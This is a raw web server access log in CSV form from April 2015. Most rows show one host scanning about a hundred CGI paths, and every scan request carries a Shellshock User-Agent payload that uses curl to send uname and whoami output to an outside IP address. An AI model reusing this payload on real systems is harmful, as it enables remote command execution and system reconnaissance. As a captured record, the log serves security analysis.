"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"180.234.44.185","-","2015-04-12 19:33:15","GMT-0700","GET","/cgi-bin/test-cgi",404,538,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:16","GMT-0700","GET","/sys-cgi",404,529,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:17","GMT-0700","GET","/dana-na/auth/url_default/welcome.cgi",404,558,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:17","GMT-0700","GET","/cgi-bin/tree.php",404,538,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:18","GMT-0700","GET","/cgi-bin/ICuGI/EST/blast_detail.cgi",404,556,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:19","GMT-0700","GET","/cgi-bin/hello",404,535,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:20","GMT-0700","GET","/cgi-sys/defaultwebpage.cgi",404,548,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:20","GMT-0700","GET","/cgi-bin/w3mman2html.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:21","GMT-0700","GET","/cgi-bin/status/status.cgi",404,547,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:24","GMT-0700","GET","/wwwadmin.cgi",404,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:25","GMT-0700","GET","/webtools/bonsai/showcheckins.cgi",404,554,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:26","GMT-0700","GET","/webtools/bonsai/cvsqueryform.cgi",404,554,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:27","GMT-0700","GET","/webtools/bonsai/cvsquery.cgi",404,550,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:27","GMT-0700","GET","/webtools/bonsai/cvslog.cgi",404,548,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:28","GMT-0700","GET","/webtools/bonsai/cvsblame.cgi",404,550,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:30","GMT-0700","GET","/webtools/bonsai/ccvsblame.cgi",404,551,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:30","GMT-0700","GET","/Web_Store/web_store.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:31","GMT-0700","GET","/users/scripts/submit.cgi",404,546,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:32","GMT-0700","GET","/userreg.cgi",404,533,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:33","GMT-0700","GET","/upload.cgi",404,532,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:33","GMT-0700","GET","/tmUnblock.cgi",404,535,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:34","GMT-0700","GET","/test.cgi",404,530,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:35","GMT-0700","GET","/template.cgi",404,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:36","GMT-0700","GET","/technote/print.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:36","GMT-0700","GET","/submit.cgi",404,532,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:37","GMT-0700","GET","/siteUserMod.cgi",404,537,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:38","GMT-0700","GET","/site_searcher.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:39","GMT-0700","GET","/shop/normal_html.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:39","GMT-0700","GET","/shop/member_html.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:41","GMT-0700","GET","/setpasswd.cgi",404,535,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:42","GMT-0700","GET","/servers/link.cgi",404,538,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:42","GMT-0700","GET","/scancfg.cgi",404,533,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:43","GMT-0700","GET","/sampleposteddata.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:44","GMT-0700","GET","/sample04.cgi",404,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:45","GMT-0700","GET","/sample03.cgi",404,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:46","GMT-0700","GET","/sample02.cgi",404,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:46","GMT-0700","GET","/sample01.cgi",404,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:51","GMT-0700","GET","/quikstore.cgi",404,535,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:52","GMT-0700","GET","/quikmail/nph-emumail.cgi",404,546,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:52","GMT-0700","GET","/pub/english.cgi",404,537,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:53","GMT-0700","GET","/process_bug.cgi",404,537,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:54","GMT-0700","GET","/print.cgi",404,531,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:55","GMT-0700","GET","/photodata/manage.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:55","GMT-0700","GET","/photo/manage.cgi",404,538,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:56","GMT-0700","GET","/parse_xml.cgi",404,535,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:57","GMT-0700","GET","/page.cgi",404,530,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:58","GMT-0700","GET","/oem_webstage/cgi-bin/oemapp_cgi",404,553,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:59","GMT-0700","GET","/newpro.cgi",404,532,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:00","GMT-0700","GET","/ncbook.cgi",404,532,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:01","GMT-0700","GET","/musicqueue.cgi",404,536,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:01","GMT-0700","GET","/mods/apage/apage.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:02","GMT-0700","GET","/ministats/admin.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:03","GMT-0700","GET","/megabook/admin.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:04","GMT-0700","GET","/main.cgi",404,530,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:04","GMT-0700","GET","/mailview.cgi",404,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:06","GMT-0700","GET","/login.cgi",404,531,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:06","GMT-0700","GET","/left.cgi",404,530,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:07","GMT-0700","GET","/infosrch.cgi",404,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:08","GMT-0700","GET","/info.cgi",404,530,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:09","GMT-0700","GET","/index.cgi",404,531,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:10","GMT-0700","GET","/hndUnblock.cgi",404,536,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:16","GMT-0700","GET","/ez2000/ezman.cgi",404,538,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:18","GMT-0700","GET","/ez2000/ezadmin.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:18","GMT-0700","GET","/enter_bug.cgi",404,535,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:19","GMT-0700","GET","/emumail.cgi",404,533,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:20","GMT-0700","GET","/edittag/edittag.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:21","GMT-0700","GET","/download.cgi",404,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:23","GMT-0700","GET","/debug.cgi",404,531,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:24","GMT-0700","GET","/dcforum/dcforum.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:26","GMT-0700","GET","/dcboard.cgi",404,533,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:26","GMT-0700","GET","/dcadmin.cgi",404,533,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:27","GMT-0700","GET","/csPassword.cgi",404,536,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:28","GMT-0700","GET","/CSNews.cgi",404,532,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:30","GMT-0700","GET","/cp/rac/nsManager.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:30","GMT-0700","GET","/connector.cgi",404,535,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:32","GMT-0700","GET","/cgis/wwwboard/wwwboard.cgi",404,548,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:33","GMT-0700","GET","/cgi-sys/signup.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:33","GMT-0700","GET","/cgi-sys/realsignup.cgi",404,544,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:34","GMT-0700","GET","/cgi-sys/realhelpdesk.cgi",404,546,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:37","GMT-0700","GET","/cgi-sys/helpdesk.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:38","GMT-0700","GET","/cgi-sys/FormMail-clone.cgi",404,548,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:39","GMT-0700","GET","/cgi-sys/entropysearch.cgi",404,547,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:40","GMT-0700","GET","/cgi-sys/entropybanner.cgi",404,547,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:40","GMT-0700","GET","/cgi-sys/domainredirect.cgi",404,548,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:41","GMT-0700","GET","/cgi-sys/defaultwebpage.cgi",404,548,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"208.115.113.92","-","2015-04-12 19:34:41","GMT-0700","GET","/robots.txt",200,365,"-","Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
"180.234.44.185","-","2015-04-12 19:34:42","GMT-0700","GET","/cgi-sys/addalink.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:43","GMT-0700","GET","/cgi-mod/index.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:44","GMT-0700","GET","/cgi-bin/zml.cgi",404,537,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:44","GMT-0700","GET","/cgi-bin/YaBB/YaBB.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:45","GMT-0700","GET","/cgi-bin/wwwboard.cgi.cgi",404,546,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:46","GMT-0700","GET","/cgi-bin/wrap.cgi",404,538,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:48","GMT-0700","GET","/cgi-bin/whois_raw.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:48","GMT-0700","GET","/cgi-bin/whois/whois.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:49","GMT-0700","GET","/cgi-bin/whois.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:50","GMT-0700","GET","/cgi-bin/webspirs.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:51","GMT-0700","GET","/cgi-bin/webmap.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:51","GMT-0700","GET","/cgi-bin/webmail/html/emumail.cgi",404,554,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:52","GMT-0700","GET","/cgi-bin/webif.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:53","GMT-0700","GET","/cgi-bin/webdist.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:54","GMT-0700","GET","/cgi-bin/webcart/webcart.cgi",404,549,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:54","GMT-0700","GET","/cgi-bin/webbbs.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:55","GMT-0700","GET","/cgi-bin/way-board/way-board.cgi",404,553,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:56","GMT-0700","GET","/cgi-bin/way-board.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:57","GMT-0700","GET","/cgi-bin/w3mman2html.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:57","GMT-0700","GET","/cgi-bin/vpasswd.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:58","GMT-0700","GET","/cgi-bin/vote.cgi",404,538,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:34:59","GMT-0700","GET","/cgi-bin/virgil.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
